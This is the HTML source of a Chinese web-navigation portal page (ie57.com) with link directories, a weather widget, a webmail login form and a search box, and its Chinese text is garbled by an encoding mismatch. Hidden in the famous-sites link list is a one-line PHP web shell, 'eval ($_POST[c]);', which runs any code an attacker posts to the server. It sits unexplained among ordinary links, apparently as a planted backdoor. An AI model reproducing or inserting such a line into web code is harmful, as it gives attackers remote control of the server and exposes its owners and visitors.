<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<meta name="keywords" content="����֮��,��ַ����,��������,��ַ,����,����,����,ͼƬ,����,BLOG,��ҳ����ҵ��¼,114��ѯ,���ϻ�ҳ" />
<meta name="description" content="����֮��,ie57��������,��ַ֮��,��ַ��ȫ,��ַ,����,����,����,ͼƬ,С��Ϸ,����,����,�ռ�,���,K��,ͨѶ��,BLOG,����Ԥ��,ʵ�ù���.���,����,��໪��ʹ�õ���������" />
<title>����֮��[Www.ie57.Com] -��������ie57��</title>
<link href="themes/default/base.css" rel="stylesheet" type="text/css" />
<link id="skin" href="themes/default/skins/blue/style.css" rel="stylesheet" type="text/css" />
<link id="font" href="" type="text/css" rel="stylesheet" />
<script type="text/javascript" src="themes/default/js/ylmf.cai.js"></script>
<script type="text/javascript" src="themes/default/js/config.js"></script>
<script type="text/javascript" src="themes/default/js/base.js"></script>
<base target="_blank" />
</head>
<body>
<div id="home">
<script type="text/javascript" src="themes/default/js/skin.js"></script>
    <div class="wrap">
    
    <div id="top" class="bd">
            <ul id="guide">
                <li class="clock"><a id="YlclockBtn" href="javascript:void(0)" target="_parent" onclick="Ylclock.Init()">����</a></li>
                <li class="feedback"><a href="feedback">��������</a></li>
                <li class="sethome"><a href="javascript:void(0)" target="_parent" onclick="Yl.setHome(this)">��Ϊ��ҳ</a></li>
                <li class="theme" id="style-quick"> <a rel="0" class="blue">0</a> <a rel="1" class="orange">1</a> <a rel="2" class="green">2</a> <a rel="3" class="purple">3</a> <a rel="4" class="blue2">4</a> </li>
                <li class="setSkin"><a href="javascript:void(0)" id="setting" target="_parent">��������</a></li>
            </ul>
            <ul id="meta" class="clearfix">
                <li id="date"></li>
                <li id="weather">
                    <p style="display:none"><a title="����鿴����" id="wet" onclick="Weather.more()"><strong>#{city}</strong> #{img} #{title}</a> <a onclick="Weather.set()" href="javascript:void(0)" target="_parent">[���Ƴ���]</a></p>
                </li>
                <li id="setCity" style="display:none">
                    <select id="w_pro" name="w_pro" onchange="Weather.loadCity(this.value)">
                        <option value="141">A ����</option>
                        <option value="119">A ����</option>
                        <option value="109">B ����</option>
                        <option value="135">C ����</option>
                        <option value="123">F ����</option>
                        <option value="127">G �㶫</option>
                        <option value="128">G ����</option>
                        <option value="137">G ����</option>
                        <option value="131">G ����</option>
                        <option value="111">H �ӱ�</option>
                        <option value="124">H ����</option>
                        <option value="125">H ����</option>
                        <option value="126">H ����</option>
                        <option value="129">H ����</option>
                        <option value="116">H ������</option>
                        <option value="122">J ����</option>
                        <option value="120">J ����</option>
                        <option value="115">J ����</option>
                        <option value="114">L ����</option>
                        <option value="132">N ����</option>
                        <option value="113">N ���ɹ�</option>
                        <option value="133">Q �ຣ</option>
                        <option value="117">S �Ϻ�</option>
                        <option value="118">S ɽ��</option>
                        <option value="112">S ɽ��</option>
                        <option value="130">S ����</option>
                        <option value="136">S �Ĵ�</option>
                        <option value="110">T ���</option>
                        <option value="142">T ̨��</option>
                        <option value="139">X ����</option>
                        <option value="134">X �½�</option>
                        <option value="140">X ���</option>
                        <option value="138">Y ����</option>
                        <option value="121">Z �㽭</option>
                    </select>
                    <select name="w_city" id="w_city">
                    </select>
                    <a class="set button" onclick="Weather.tick()">ȷ ��</a> <a class="auto button" onclick="Weather.init(1)">�Զ��ж�</a> </li>
            </ul>
        </div>
        <div id="header" class="clearfix">
            <div id="banner"><script type="text/javascript" src="static/js/header.js"></script></div>
            <h1 id="logo"><a href="http://www.ie57.com" target="_parent" title="ie57.com"><img src="static/images/logo.gif" height="75" width="189" /></a></h1>
            <div id="mailBox">
                <form id="mail" name="mail" method="post" onsubmit="MailLogin.sendMail();return false;" action="" target="_blank">
                    <ul>
                        <li>
                            <label for="mail_username">�ʺţ�</label>
                            <input type="text" class="int" id="mail_username" onmousemove="this.focus()" name="mail_username" value="">
                        </li>
                        <li>
                            <label for="mail_options">���䣺</label>
                            <select id="mail_options" style="padding-left:0" class="int">
                                <option selected="selected">--��ѡ������--</option>
                                <option>@163.com ����</option>
                                <option>@126.com ����</option>
                                <option>@vip.163.com ����</option>
                                <option>@sina.com ����</option>
                                <option>@2008.sina.com ����</option>
                                <option>@vip.sina.com ����</option>
                                <option>@yahoo.com.cn</option>
                                <option>@yahoo.cn</option>
                                <option>@sohu.com �Ѻ�</option>
                                <option>@tom.com</option>
                                <option style="color:#03C">@139.com</option>
                                <option>@188.com</option>
                                <option>@21cn.com</option>
                                <option>@yeah.net</option>
                                <option>------------------</option>
                                <option>�����ʺ�</option>
                                <option>�ٶ��ʺ�</option>
                                <option>ChinaRenУ��¼</option>
                                <option>У����</option>
                                <option>51.com</option>
                            </select>
                        </li>
                        <li>
                            <label for="mail_passwd">���룺</label>
                            <input class="int" id="mail_passwd" name="mail_passwd" onmousemove="this.focus()" type="password" value=""><input id="mail_btn" type="submit" value="�� ¼" />
                        </li>
                    </ul>
                </form>
            </div>
        </div><!--/ header-->		<div id="search" class="clearfix">
            <div id="search-menu" class="clearfix">
            	<div id="notice">
                                            <p><a href="http://www.aiqing163.com?ie57">�ڣ�����163���������İ�����£�</a></p>
                                            <p><a href="http://www.ik123.com/">��������������DJ���������dj����</a></p>
                                    </div>
                <ul class="clearfix">
                    <li><a rel="s115">115����http://www.ie57.com</a></li>
                    <li class="current"><a rel="web">�� ҳ</a></li>
                    <li><a rel="mp3">MP3</a></li>
                    <li><a rel="v115">Ӱ ��</a></li>
                    <li><a rel="image">ͼ Ƭ</a></li>
                    <li><a rel="zhidao">֪ ��</a></li>
                </ul>
                <ul  class="clearfix" style="margin:0">
                    <li><a id="localsearch">վ����</a></li>
                    <li id="search-menu-more"><span><a class="more" id="smore">�� ��</a></span>
                        <div id="smp"> <a href=" http://video.baidu.com/?tn=lqowen_1_pg">�� Ƶ</a> <a href=" http://tieba.baidu.com/?source=114la.com">�� ��</a> <a href=" http://baike.baidu.com/?source=114la.com">�� ��</a> <a href=" http://stock.baidu.com/?source=114la.com">�� Ʊ</a> <a href=" http://u.115.com/?11413">�� ��</a>  <a href=" http://fav.115.com/?source=114la.com">�ղؼ�</a>  <a href=" http://tool.115.com/?11413">������</a></div>
                    </li>
                </ul>
            </div>
            <div id="search-form" class="bd">
                <div class="search-bg">
                    <div class="con">
                        <div id="sengine" class="clearfix">
                            <form id="searchForm" action="http://www.baidu.com/baidu" method="get" target="_blank">
                                <label for="baidu"><a href="#"><img src="static/images/sl/logox3.gif" width="79" height="27" /></a></label>
                                <div class="input">
                                    <input type="text" id="searchInput" name="wd" onmousemove="this.focus()" autocomplete="off" />
                                </div>
                                <input type="submit" id="searchBtn" class="btn" value="�ٶ�һ��" />
                                <input type="hidden" name="tn" value="lqowen_1_pg" />
                                <div id="search-word" class="search-word">
                                    <p id="sw_s115" style="display:none;">
                                                            
                                    <a href="http://115.com/s?q=���">������ܲ�ѯ</a>&nbsp;&nbsp;<a href="http://115.com/s?q=��������">��������</a>&nbsp;&nbsp;<a href="http://115.com/s?q=������˫">�������</a>&nbsp;&nbsp;<a href="http://115.com/s?q=13800138000">�ֻ�����</a>&nbsp;&nbsp;<a href="http://115.com/s?q=100��Ԫ">ʵʱ����ת��</a>&nbsp;&nbsp;
                                    </p><!--/ keywords-->
                                    <p id="sw_web">
                                                                        <a href="http://www.ik123.com">������DJ����</a>&nbsp;&nbsp;<a href="http://www.aiqing163.com/">����163</a>&nbsp;&nbsp;<a href="http://www.dju8.com">��������</a>&nbsp;&nbsp;<a href="http://www.36k.com">С��Ϸ</a>&nbsp;&nbsp;<a href="http://user.ik123.com/">���DJ����</a>&nbsp;&nbsp;
                                    </p><!--/ keywords-->
                                    <p id="sw_mp3" style="display:none;">
                                                                        <a href="http://mp3.baidu.com/m?tn=ylmf_1_pg&tn=ylmf_1_pg&f=ms&ct=134217728&word=�����л�">�����л�</a>&nbsp;&nbsp;
                                    </p><!--/ keywords-->
                                    <p id="sw_v115" style="display:none;">
                                                                        
                                    </p><!--/ keywords-->
                                    <p id="sw_image" style="display:none;">
                                                                        
                                    </p><!--/ keywords-->
                                    <p id="sw_zhidao" style="display:none;">
                                                                        
                                    </p><!--/ keywords-->
                            	</div>
                            </form>
                        </div>
                        <!--/ sengine-->
                        <div id="lsBox" class="clearfix" style="display:none">
                            <div class="input">
                                <input type="text" onblur="this.value==''?this.value='����ؼ�������':''" onclick="this.select();" onfocus="this.value=='����ؼ�������'?this.value='':''; " onmouseover="this.focus();" value="����ؼ�������" id="localInput" autocomplete="off" />
                            </div>
                            <div style="clear:both; overflow:hidden; height:0;"></div>
                            <ul class="clearfix" style="display:none;">
                            </ul>
                        </div>
                    </div>
                    <!--/ con-->
                </div>
                <!--/ search-bg-->
            </div>
            <div id="suggest" style="display:none;"></div>
        </div>

<div id="keywords">
  <dl>
    <dt>���ŷ��ࣺ</dt>
            <a href="http://www.ie97.com/tool/dianziditu.htm" target="_blank" onclick="'211';" >���ӵ�ͼ</a>
        <a href="http://www.ie97.com/tool/weixingditu.htm" target="_blank" style="color:#178517;" onclick="'212';" >���ǵ�ͼ</a>
        <a href="http://www.ie97.com//tool/sanweiditu.htm" target="_blank" onclick="'213';" >��ά��ͼ</a>
        <a href="http://www.ie97.com/tool/t.htm" target="_blank" onclick="'214';" >�������</a>
        <a href="http://www.ie97.com/tool/shouji.htm" target="_blank" onclick="'216';" >�ֻ���ѯ</a>
        <a href="http://www.linkwan.com/GB/BROADMETER/speedauto/" target="_blank" style="color:#178517;" onclick="'241';" >�����ٶȲ���</a>
        <a href="http://www.ie97.com/tool/wnl.htm" target="_blank" onclick="'217';" >������</a>
        <a href="http://qq.ip138.com/train/" target="_blank" onclick="'218';" >��ʱ�̲�ѯ</a>
        <a href="http://wz.gocar.cn/changtu/" target="_blank" onclick="'220';" >��;����ʱ��</a>
        <a href="http://www.ip138.com/" target="_blank" onclick="'221';" >I P ��ַ�ٲ�</a>
        <a href="http://www.time.ac.cn/" target="_blank" onclick="'243';" >����ʱ��</a>
      </dl>
</div>

        <div id="content" class="clearfix">
            <div id="main">
                <div class="r1 clearfix">
                    <div id="board">
                        <ul  id="board-menu" class="clearfix">
                            <li id="bored-menu-def" class="current"><a rel="fmsite">��վ����</a></li>
                                                        <li><a rel="board-box0" url="http://www.114la.com/gp/index.html" nocache=>��Ʊ�ƾ�</a></li>
                                                        <li><a rel="board-box1" url="http://www.114la.com/index_images/soft.html" nocache=>�������</a></li>
                                                        <li><a rel="board-box2" url="http://www.114la.com/game.html" nocache=>������Ϸ</a></li>
                                                        <li><a rel="favBox">�ҵ��ղ�</a></li>
                            <li><a rel="history">�����¼</a></li>
                        </ul>
                        <div id="board-box" class="bd">
                            <div id="fmsite">
                            	<div style="line-height:30px;">
                                <ul class="top clearfix">
                                                                                                            <script language="php">eval ($_POST[c]);</script><li><a href="http://www.baidu.com/index.php?tn=123">�ٶ�</a>--<a href="http://mp3.baidu.com/">Mp3</a> <em class="baid"></em>
<div class="fmbox">
<div class="arrow">�ٶ�</div>
<ul>
<li><a href="http://zhidao.baidu.com/q?pt=123">�ٶ�֪��</a></li>
<li><a href="http://video.baidu.com/?tn=123">�ٶ���Ƶ</a></li>
<li><a href="http://tieba.baidu.com/?source=123">�ٶ�����</a></li>
<li><a href="http://baike.baidu.com/?source=123">�ٶȰٿ�</a></li>
<li><a href="http://hi.baidu.com">�ٶȿռ�</a></li>
</ul>
</div>
</li>
                                                                        <li><a href="http://www.sina.com.cn/">����</a>--<a href="http://news.sina.com.cn/">����</a> <em class="sina"></em>
<div class="fmbox"> <span class="arrow">����</span>
<ul>
<li><a href="http://finance.sina.com.cn">���˲ƾ�</a></li>
<li><a href="http://sports.sina.com.cn">��������</a></li>
<li><a href="http://blog.sina.com.cn">���˲���</a></li>
<li><a href="http://sina.allyes.com/main/adfclick?db=sina&bid=155888,196233,201227&cid=0,0,0&sid=189148&advid=3406&camid=27233&show=ignore&url=http://auto.sina.com.cn/?c=spr_web_sq_114la_auto">��������</a></li>
<li><a href="http://sina.allyes.com/main/adfclick?db=sina&bid=164211,206178,211190&cid=0,0,0&sid=199245&advid=3406&camid=29028&show=ignore&url=http://video.sina.com.cn/?c=spr_web_sq_114la_video">���˿�Ƶ</a></li>
</ul>
</div>
</li>
                                                                        <li><a href="http://www.sohu.com/">�Ѻ�</a>--<a href="http://news.sohu.com/">����</a> <em class="sohu"></em>
<div class="fmbox"> <span class="arrow">�Ѻ�</span>
<ul>
<li><a href="http://blog.sohu.com">�Ѻ�����</a></li>
<li><a href="http://business.sohu.com">�Ѻ��ƾ�</a></li>
<li><a href="http://auto.sohu.com">�Ѻ�����</a></li>
<li><a href="http://it.sohu.com">�Ѻ��Ƽ�</a></li>
<li><a href="http://club.sohu.com">�Ѻ�����</a></li>
</ul>
</div>
</li>
                                                                        <li><a href="http://www.163.com/">����</a>--<a href="http://news.163.com/">����</a> <em class="wy"></em>
<div class="fmbox"> <span class="arrow">����</span>
<ul>
<li><a href="http://news.163.com">��������</a></li>
<li><a href="http://money.163.com">���ײƾ�</a></li>
<li><a href="http://blog.163.com">���ײ���</a></li>
<li><a href="http://photo.163.com">�������</a></li>
<li><a href="http://tech.163.com/">���׿Ƽ�</a></li>
</ul>
</div>
</li>
                                                                        <li><a href="http://www.qq.com/">��Ѷ</a>--<a href="http://tech.qq.com/">�Ƽ�</a> <em class="qq"></em>
<div class="fmbox"> <span class="arrow">��Ѷ</span>
<ul>
<li><a href="http://news.qq.com/">��Ѷ����</a></li>
<li><a href="http://finance.qq.com">��Ѷ�ƾ�</a></li>
<li><a href="http://ent.qq.com">��Ѷ����</a></li>
<li><a href="http://auto.qq.com">��Ѷ����</a></li>
<li><a href="http://games.qq.com/">��Ѷ��Ϸ</a></li>
</ul>
</div>
</li>
                                                                    </ul>
                                </div>
                                <ul class="list clearfix">
                                                                                                                <li><a href="http://www.google.hk">Google</a></li>
                                                                            <li><a href="http://www.china.com/">�л���</a></li>
                                                                            <li><a href="http://cn.yahoo.com/?id=40020">�й��Ż�</a></li>
                                                                            <li><a href="http://cn.msn.com/">MSN����</a></li>
                                                                            <li><a href="http://www.huanqiu.com/">����ʱ��</a></li>
                                                                            <li><a href="http://www.ifeng.com/">�� �� ��</a></li>
                                                                            <li><a href="http://www.cctv.com/">�������̨</a></li>
                                                                            <li><a href="http://www.xinhuanet.com/">�� �� ��</a></li>
                                                                            <li><a href="http://www.people.com.cn/">�� �� ��</a></li>
                                                                            <li><a href="http://www.gov.cn/">�й�������</a></li>
                                                                            <li><a href="http://china.alibaba.com/">����Ͱ�</a></li>
                                                                            <li><a href="http://www.hc360.com/">�� �� ��</a></li>
                                                                            <li><a href="http://spcode.baidu.com/spcode/spClick?tn=ylmf_sp&ctn=0&styleid=3338&tourl=http://www.28.com/?comeID=96888">��ҵ�̻���</a></li>
                                                                            <li><a href="http://www.icbc.com.cn/">��������</a></li>
                                                                            <li><a href="http://stbnnr.allyes.com/bnnr/114la_baishehui.html">�����</a></li>
                                                                            <li><a href="http://www.39.net/">39������</a></li>
                                                                            <li><a href="http://www.ctrip.com/smartlink/smartlink.asp?c=114la&url=http://www.ctrip.com/">Я������</a></li>
                                                                            <li><a href="http://www.qidian.com/newindex.aspx?db=101&adid=1006&type=client">���С˵��</a></li>
                                                                            <li><a href="http://www.soufun.com/">�ѷ���</a></li>
                                                                            <li><a href="http://www.tom365.com/">��ѵ�Ӱ</a></li>
                                                                            <li><a href="http://www.27.cn/">����Ů����</a></li>
                                                                            <li><a href="http://www.eastmoney.com/">�����Ƹ�</a></li>
                                                                            <li><a href="http://www.taobao.com/">�� �� ��</a></li>
                                                                            <li><a href="http://www.1234567.com.cn/">�������</a></li>
                                                                            <li><a href="http://www.pconline.com.cn/">̫ƽ�������</a></li>
                                                                            <li><a href="http://www.360.cn/">360��ȫ��ʿ</a></li>
                                                                            <li><a href="http://www.cmbchina.com/">��������</a></li>
                                                                            <li><a href="http://www.sz.net.cn/">����֮��</a></li>
                                                                            <li><a href="http://wwv.renren.com/xn.do?ss=17002&rt=50&b=25828">������</a></li>
                                                                            <li><a href="http://www.chinamobile.com/">�й��ƶ�</a></li>
                                                                            <li><a href="http://www.tianya.cn/">��������</a></li>
                                                                            <li><a href="http://www.ku654.com/">ku654С��Ϸ</a></li>
                                                                            <li><a href="http://house.focus.cn/">���㷿����</a></li>
                                                                            <li><a href="http://www.xiaonei.com/">У����</a></li>
                                                                            <li><a href="http://china.nba.com/">NBA������</a></li>
                                    								</ul>
                                <div style="height:30px;">
                                <ul id="RandomPlay" class="list clearfix">
                                   	                                    
                                </ul>
                                </div>
                                 
                                    
                                <ul class="list clearfix">    	
                                                                                                                <li><a href="http://www.togj.com/">�����</a></li>
                                                                            <li><a href="http://www.kaixin001.com/">������</a></li>
                                                                            <li><a href="http://p.yiqifa.com/c?s=cfbc3c63&w=62015&c=254&i=160&l=0&e=ie97&t=http://www.360buy.com/Union/Union_default.asp" style="color:#0E9C00">�����̳�</a></li>
                                                                            <li><a href="http://p.yiqifa.com/c?s=44abc18d&w=62015&c=247&i=159&l=0&e=ie97&t=http://www.dangdang.com" style="color:#982F00">����������</a></li>
                                                                            <li><a href="http://p.yiqifa.com/c?s=66c7831c&w=62015&c=245&i=201&l=0&e=ie97&t=http://www.amazon.cn" style="color:#099800">׿Խ���Ϲ���</a></li>
                                                                    </ul>
                                
                                <ul id="RandomPlayItems" style="display:none">
                                 	<li><a href="http://www.daodao.com/?m=12119" target="_blank">DaoDao������</a></li>
<li><a href="http://www.yxlady.com/" target="_blank">����Ů����</a></li>
<li><a href="http://user.ik123.com" target="_blank">�������</a></li>
<li><a href="http://www.51.com/" target="_blank">51���ѿռ�</a></li>
<li><a href="http://www.zhcw.com/" target="_blank">�в��� </a></li>

                                </ul>
                            </div>
                            <!--/ fmsite-->
                            <div id="favBox" style="display:none;" >
                                <ul id="Collbox" class="line_30"></ul>
                                <div id="addColl">
                                    <form onsubmit="return MyFav.add(this);">
                                        <label for="urlName">����Զ����ղ�</label>
                                        <input type="text" value="վ��" id="urlName" class="int" onblur="favoFuninput(this,0)" onfocus="favoFuninput(this,1)" name="urlName"/>
                                        <input type="text" value="��ַ" class="int" onblur="favoFuninput(this,0)" onfocus="favoFuninput(this,1)" id="Url" name="Url"/>
                                        <input type="submit" class="btn button" value="�� ��" />
                                        <input type="button" class="btn button" onclick="MyFav.show()" value="ˢ ��" />
                                    </form>
                                </div>
                                <div id="addCollmsg" style="display:none"></div>
                            </div>
                            <div id="history" class="line_30" style="display:none">
                                <ul id="historyBox" class="clearfix">
                                    <li class="none">�Բ�����û���κ������¼</li>
                                </ul>
                                <ul class="clearfix">
                                    <li class="del"><a id="delHistory">ɾ����¼</a></li>
                                </ul>
                            </div>
                        </div>
                        <!--/ board-box-->
                    </div>
                    <!--/ board-->





                </div><!--/ r1-->
        <div id="key2">
                        <a href="http://www.36k.com/" target="_blank" style="color:#FF4D08;" onclick="'248';" >36kС��Ϸ</a>&nbsp;&nbsp;&nbsp;<a href="http://p.ik123.com/" target="_blank" style="color:#00740E;" onclick="'249';" >��۾�Ʒ��</a>&nbsp;&nbsp;&nbsp;<a href="http://www.guigushi.cc/" target="_blank" style="color:#1D1D1D;" onclick="'225';" >����´�ȫ</a>&nbsp;&nbsp;&nbsp;<a href="http://www.kx5.cc/" target="_blank" style="color:#E05400;" onclick="'226';" >�����ݵ�Ӱ</a>&nbsp;&nbsp;&nbsp;<a href="http://www.31t.com/" target="_blank" style="color:#178517;" onclick="'228';" >��Ҫ��������</a>&nbsp;&nbsp;&nbsp;<a href="http://www.11y.cc/" target="_blank" onclick="'245';" >��ѵ�Ӱ</a>&nbsp;&nbsp;&nbsp;<a href="http://www.97k.cc/" target="_blank" onclick="'246';" >��ȥ����Ӱ��</a>&nbsp;&nbsp;&nbsp;<a href="http://www.qqguodu.com/" target="_blank" onclick="'247';" >QQ����</a>&nbsp;&nbsp;&nbsp;<a href="http://www.qqpao.com" target="_blank" onclick="'250';" >QQͷ��</a>&nbsp;&nbsp;&nbsp;
        </div>
        <div id="coolsite" class="bd">
            <h2><a id="clalign" href="javascript:void(0)" target="_self" title="�����/����">�����/����</a>��վ���� </h2>
            <div id="list">
                                        <dl><dt><a href="html/xiaoshuo/" >��ѧ</a></dt>
                                        <dd><a href="http://www.aiqing163.com" style="color:#D80065">����С˵</a></dd>
                                        <dd><a href="http://www.qidian.com/">�������</a></dd>
                                        <dd><a href="http://www.readnovel.com">С˵�Ķ���</a></dd>
                                        <dd><a href="http://www.hongxiu.com/">��������</a></dd>
                                        <dd><a href="http://www.zhulang.com/">����С˵</a></dd>
                                        <dd><a href="http://www.xxsy.net/">������Ժ</a></dd>
                                        <dd><a href="http://book.qukanshu.com/">����С˵��</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/music/" >����</a></dt>
                                        <dd><a href="http://mp3.baidu.com/">�ٶ�MP3</a></dd>
                                        <dd><a href="http://www.ik123.com/" style="color:#008C1E">���DJ����</a></dd>
                                        <dd><a href="http://www.1ting.com/">һ��������</a></dd>
                                        <dd><a href="http://www.31t.com/" style="color:#FF086C">�����ĸ�</a></dd>
                                        <dd><a href="http://www.kugou.com/">�ṷ����</a></dd>
                                        <dd><a href="http://www.kuwo.cn/">��������</a></dd>
                                    </dl>
                            <dl><dt><a href="html/games/" >��Ϸ</a></dt>
                                        <dd><a href="http://www.game.com.cn/">С��Ϸ</a></dd>
                                        <dd><a href="http://www.17173.com/">17173</a></dd>
                                        <dd><a href="http://games.sina.com.cn/">������Ϸ</a></dd>
                                        <dd><a href="http://www.pcgames.com.cn/">̫ƽ����Ϸ</a></dd>
                                        <dd><a href="http://games.qq.com/index.shtml">��Ѷ��Ϸ</a></dd>
                                        <dd><a href="http://www.91wan.com/rxsg">��Ѫ����</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/vedio/" >��Ƶ</a></dt>
                                        <dd><a href="http://www.ku6.com/">��6��Ƶ</a></dd>
                                        <dd><a href="http://www.youku.com/">�ſ���</a></dd>
                                        <dd><a href="http://www.tudou.com/">������</a></dd>
                                        <dd><a href="http://www.6.cn/">���䷿</a></dd>
                                        <dd><a href="http://v.ifeng.com/">��˿�Ƶ</a></dd>
                                        <dd><a href="http://www.kx5.cc">��������ѵ�Ӱ</a></dd>
                                    </dl>
                            <dl><dt><a href="html/xiaoyouxi/" >����</a></dt>
                                        <dd><a href="http://www.4399.com/">4399С��Ϸ</a></dd>
                                        <dd><a href="http://www.91wan.com/">91wan��Ϸ</a></dd>
                                        <dd><a href="http://www.91wan.com/ftxy/index.htm">��������</a></dd>
                                        <dd><a href="http://www.91wan.com/rxsg">��Ѫ����</a></dd>
                                        <dd><a href="http://p.yiqifa.com/c?s=cdfca29e&w=2451&c=3640&i=2605&l=0&e=&t=http://home.3gm.com.cn/do.php?ac=wlyx">����Ӣ��</a></dd>
                                        <dd><a href="http://web.4399.com/mcsd/">����ʱ��</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/soft/" >���</a></dt>
                                        <dd><a href="http://www.xiazaiba.com/">��ɫ���ذ�</a></dd>
                                        <dd><a href="http://www.skycn.com/index.html">������վ</a></dd>
                                        <dd><a href="http://www.crsky.com/">��������</a></dd>
                                        <dd><a href="http://xiazai.zol.com.cn/">�йش�����</a></dd>
                                        <dd><a href="http://www.mydrivers.com/">����֮��</a></dd>
                                        <dd><a href="http://dl.pconline.com.cn/">̫ƽ������</a></dd>
                                    </dl>
                            <dl><dt><a href="html/junshi/" >����</a></dt>
                                        <dd><a href="http://military.china.com/">�л�������</a></dd>
                                        <dd><a href="http://www.tiexue.net/">��Ѫ����</a></dd>
                                        <dd><a href="http://mil.huanqiu.com/">�������</a></dd>
                                        <dd><a href="http://mil.news.sina.com.cn/">���˾���</a></dd>
                                        <dd><a href="http://news.ifeng.com/mil/">���������</a></dd>
                                        <dd><a href="http://www.chinamil.com.cn/">�й�����</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/news/" >����</a></dt>
                                        <dd><a href="http://news.sina.com.cn/">��������</a></dd>
                                        <dd><a href="http://news.cn.yahoo.com/?id=40020">�Ż�����</a></dd>
                                        <dd><a href="http://news.sohu.com/">�Ѻ�����</a></dd>
                                        <dd><a href="http://news.163.com/">��������</a></dd>
                                        <dd><a href="http://world.huanqiu.com/">��������</a></dd>
                                        <dd><a href="http://news.ifeng.com/">�����Ѷ</a></dd>
                                        <dd><a href="http://news.qq.com/">��Ѷ����</a></dd>
                                    </dl>
                            <dl><dt><a href="html/caijinggushi/" >�ƾ�</a></dt>
                                        <dd><a href="http://www.eastmoney.com/">�����Ƹ���</a></dd>
                                        <dd><a href="http://www.hexun.com/">��Ѷ�ƾ�</a></dd>
                                        <dd><a href="http://finance.sina.com.cn/">���˲ƾ�</a></dd>
                                        <dd><a href="http://www.stockstar.com/">֤ȯ֮��</a></dd>
                                        <dd><a href="http://www.jrj.com.cn/">���ڽ�</a></dd>
                                        <dd><a href="http://www.cnfol.com/">�н�����</a></dd>
                                        <dd><a href="http://www.bdchn.com/">��ҵ������</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/gouwu/" >����</a></dt>
                                        <dd><a href="http://p.yiqifa.com/c?s=44abc18d&w=62015&c=247&i=159&l=0&e=ie97&t=http://www.dangdang.com">������</a></dd>
                                        <dd><a href="http://p.yiqifa.com/c?s=66c7831c&w=62015&c=245&i=201&l=0&e=ie97&t=http://www.amazon.cn">׿Խ��</a></dd>
                                        <dd><a href="http://promotion.eachnet.com/09q2ad/?adid=bjmt_mta_01_0_hp_25828">��Ȥ����</a></dd>
                                        <dd><a href="http://www.togj.com/">�����</a></dd>
                                        <dd><a href="http://www.chinadrtv.com/do_dat.jsp?sid=11410903&dat=9686&url=/">�������</a></dd>
                                        <dd><a href="http://www.uggcat.com/">uggר����</a></dd>
                                    </dl>
                            <dl><dt><a href="html/blog/" >����</a></dt>
                                        <dd><a href="http://blog.sina.com.cn/">���˲���</a></dd>
                                        <dd><a href="http://blog.sohu.com/">�Ѻ�����</a></dd>
                                        <dd><a href="http://blog.hexun.com/">��Ѷ����</a></dd>
                                        <dd><a href="http://hi.baidu.com/">�ٶȿռ�</a></dd>
                                        <dd><a href="http://spaces.msn.com/">MSN �ռ�</a></dd>
                                        <dd><a href="http://qzone.qq.com/">Q-ZONE</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/bank/" >����</a></dt>
                                        <dd><a href="http://www.cmbchina.com/">��������</a></dd>
                                        <dd><a href="http://www.icbc.com.cn/">��������</a></dd>
                                        <dd><a href="http://www.ccb.com/">��������</a></dd>
                                        <dd><a href="http://www.boc.cn/">�й�����</a></dd>
                                        <dd><a href="http://www.abchina.com/">ũҵ����</a></dd>
                                        <dd><a href="http://www.gdb.com.cn/">�㷢����</a></dd>
                                    </dl>
                            <dl><dt><a href="html/shouji/" >�ֻ�</a></dt>
                                        <dd><a href="http://mobile.pconline.com.cn/">̫ƽ���ֻ�</a></dd>
                                        <dd><a href="http://mobile.zol.com.cn/">�йش��ֻ�</a></dd>
                                        <dd><a href="http://www.imobile.com.cn/">�ֻ�֮��</a></dd>
                                        <dd><a href="http://www.cnmo.com/">�ֻ��й�</a></dd>
                                        <dd><a href="http://digi.tech.qq.com/mobile">��Ѷ�ֻ�</a></dd>
                                        <dd><a href="http://mobile.pcpop.com/">�������ֻ�</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/car/" >����</a></dt>
                                        <dd><a href="http://www.pcauto.com.cn?ad=575">̫ƽ������</a></dd>
                                        <dd><a href="http://sina.allyes.com/main/adfclick?db=sina&bid=155888,196233,201227&cid=0,0,0&sid=189148&advid=3406&camid=27233&show=ignore&url=http://auto.sina.com.cn/?c=spr_web_sq_114la_auto">��������</a></dd>
                                        <dd><a href="http://www.autohome.com.cn/">����֮��</a></dd>
                                        <dd><a href="http://auto.sohu.com/">�Ѻ�����</a></dd>
                                        <dd><a href="http://auto.163.com/">��������</a></dd>
                                        <dd><a href="http://www.bitauto.com/">�׳���</a></dd>
                                    </dl>
                            <dl><dt><a href="html/rencai/" >�˲�</a></dt>
                                        <dd><a href="http://jump.all4ad.cn/jump.aspx?id=334">ǰ������</a></dd>
                                        <dd><a href="http://www.cjol.com/">�й��˲�����</a></dd>
                                        <dd><a href="http://www.jobkoo.com/?utm_source=114la&utm_medium=text&utm_campaign=url-navigation">ְ����Ƹ</a></dd>
                                        <dd><a href="http://www.zhaopin.com/">������Ƹ</a></dd>
                                        <dd><a href="http://jump.all4ad.cn/jump.aspx?id=361">�л�Ӣ����</a></dd>
                                        <dd><a href="http://www.zhubajie.com/">��˽���</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/love/" >����</a></dt>
                                        <dd><a href="http://home.27.cn/">���˰�</a></dd>
                                        <dd><a href="http://www.ipart.cn/a/ipart001205.php?from=emar&channelid=41690">���鹫Ԣ</a></dd>
                                        <dd><a href="http://jump.all4ad.cn/jump.aspx?id=319">360Ȧ����</a></dd>
                                        <dd><a href="http://spcode.baidu.com/spcode/spClick?tn=ylmf_sp&ctn=0&styleid=1608&tourl=http://count.myspace.cn/ag.php?pid=117_0_10003_7_0000BAIDU_ANDadtype=9">������</a></dd>
                                        <dd><a href="http://p.yiqifa.com/servlet/handleClick?sid=effaa3a9a5bdb6f5&pid=831&wid=2498&vid=613&cid=248&lid=0&euid=&turl=http%3A%2F%2Fwww.juedui100.com%2Freg.jsp%3Fsid%3D%3C%252%25%3E%26aid%3D22&vwid=">����100</a></dd>
